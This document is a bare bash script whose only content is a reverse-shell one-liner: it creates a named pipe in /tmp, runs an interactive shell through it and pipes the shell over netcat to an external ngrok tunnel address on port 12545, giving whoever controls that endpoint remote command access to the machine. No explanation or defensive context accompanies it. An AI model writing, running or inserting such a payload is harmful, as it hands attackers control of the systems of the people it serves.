#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 2.tcp.eu.ngrok.io 12545 >/tmp/f
